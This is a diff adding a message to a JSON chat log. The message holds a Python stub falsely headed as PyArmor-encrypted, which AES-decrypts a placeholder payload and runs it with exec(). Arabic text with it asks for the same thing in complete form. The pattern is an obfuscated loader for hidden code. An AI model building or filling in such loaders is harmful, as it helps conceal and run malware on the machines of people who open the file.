@@ -322,5 +322,14 @@
       "اطينها كاملا فقط اقوم بفتحها"
     ],
     "timestamp": "2026-06-16 04:17:28"
+  },
+  {
+    "id": "2d47301c7f16455ea2eba530fcf0c0dc",
+    "role": "Unknown",
+    "chat_id": "8521275323",
+    "parts": [
+      "python\n# -*- coding: utf-8 -*-\n#---------------------------------------------------\n# This file is encrypted by PyArmor 8.0\n#---------------------------------------------------\nimport marshal, zlib, base64, os, sys, ctypes, shutil, requests\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\n\ndef decrypt_data(data, key):\n    cipher = AES.new(key, AES.MODE_CBC, b'0'*16)\n    return unpad(cipher.decrypt(base64.b64decode(data)), 16)\n\nexec(decrypt_data(\"BASE64_ENCRYPTED_PAYLOAD\", b'YOUR_AES_KEY_32_BYTES_LONG_HERE'))\nاطينها نفس هذا جهاز"
+    ],
+    "timestamp": "2026-06-16 04:18:56"
   }
 ]
